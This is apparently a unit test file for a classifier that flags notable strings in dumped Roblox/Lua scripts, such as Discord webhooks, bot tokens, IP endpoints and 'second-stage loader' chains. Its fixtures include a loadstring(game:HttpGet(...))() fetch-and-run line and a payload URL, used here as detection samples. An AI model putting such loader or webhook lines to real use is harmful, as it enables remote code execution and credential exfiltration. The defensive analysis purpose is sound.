/**
 * v2.25.0 suite — notable-string classifier (dumper upgrade).
 * Pure unit tests: kind assignment, priority order, caps, dedupe.
 */
import assert from 'node:assert/strict';
import { classifyString, classifyStrings, kindLabel, NOTABLE_KINDS } from '../src/notable.js';

const tests = [];
const test = (name, fn) => tests.push({ name, fn });

test('classify: discord webhook URL', () => {
  assert.equal(classifyString('https://discord.com/api/webhooks/123456/abcdef-GHijklmn'), 'webhook');
  assert.equal(classifyString('https://discordapp.com/api/v9/webhooks/1/x'), 'webhook');
});

test('classify: discord bot token shape', () => {
  // synthetic fixture — same three-segment shape, NOT a live credential
  assert.equal(classifyString('AAAABBBBCCCCDDDDEEEEFFFF.Ggk2bV.CDDAxgngiMbMvzLyki3qiYEEg0_A3WvHHxicyk'), 'token');
});

test('classify: generic URL', () => {
  assert.equal(classifyString('https://pastefy.app/raw/abc123'), 'url');
  assert.equal(classifyString('http://10.0.0.1/payload.lua'), 'url');
});

test('classify: IP endpoint', () => {
  assert.equal(classifyString('203.0.113.9:25565'), 'ip-endpoint');
  assert.equal(classifyString('198.51.100.7'), 'ip-endpoint');
});

test('classify: second-stage loader chain', () => {
  assert.equal(classifyString("loadstring(game:HttpGet('https://x.y/p.lua'))()"), 'loader');
});

test('classify: credential keyword context', () => {
  assert.equal(classifyString('set_api_key_here_for_premium_access'), 'secret');
  assert.equal(classifyString('please_enter_your_password_again'), 'secret');
});

test('classify: roblox asset reference', () => {
  assert.equal(classifyString('rbxassetid://1823947563'), 'asset');
  assert.equal(classifyString('https://c0.rbxcdn.com/abc'), 'asset');
});

test('classify: plain strings and short noise stay unclassified', () => {
  assert.equal(classifyString('Hello from MoonSec VM'), null);
  assert.equal(classifyString('abc'), null);
  assert.equal(classifyString(''), null);
  assert.equal(classifyString(null), null);
});

test('classifyStrings: priority order — webhook beats URL, token beats base64', () => {
  const out = classifyStrings([
    'https://discord.com/api/webhooks/1/abc',
    'AAAABBBBCCCCDDDDEEEEFFFF.Ggk2bV.CDDAxgngiMbMvzLyki3qiYEEg0_A3WvHHxicyk',
    'https://example.com/regular-page',
    'loadstring(game:HttpGet("https://loader/x"))()',
    'Hello from MoonSec VM',
    'Hello from MoonSec VM', // dupe — dropped
  ]);
  assert.equal(out[0].kind, 'webhook');
  assert.equal(out[1].kind, 'token');
  assert.equal(out[2].kind, 'loader');
  assert.equal(out[3].kind, 'url');
  assert.ok(!out.some((x) => x.s === 'Hello from MoonSec VM'), 'unclassified strings must be dropped');
});

test('classifyStrings: cap respected', () => {
  const many = [];
  for (let i = 0; i < 50; i++) many.push(`https://example.com/page-${i}`);
  assert.equal(classifyStrings(many, { cap: 10 }).length, 10);
});

test('kindLabel: every kind has a label', () => {
  for (const k of NOTABLE_KINDS) {
    const label = kindLabel(k);
    assert.equal(typeof label, 'string');
    assert.ok(label.length > 0);
  }
});

// ---- runner -------------------------------------------------------------------
let failed = 0;
for (const t of tests) {
  try {
    await t.fn();
    console.log(`  PASS ${t.name}`);
  } catch (e) {
    failed += 1;
    console.error(`  FAIL ${t.name}`);
    console.error(`    ${String(e && e.message || e).split('\n').slice(0, 6).join('\n    ')}`);
  }
}
if (failed) {
  console.error(`\n${failed} test(s) FAILED`);
  process.exit(1);
}
console.log(`\n${tests.length} passed, 0 failed`);
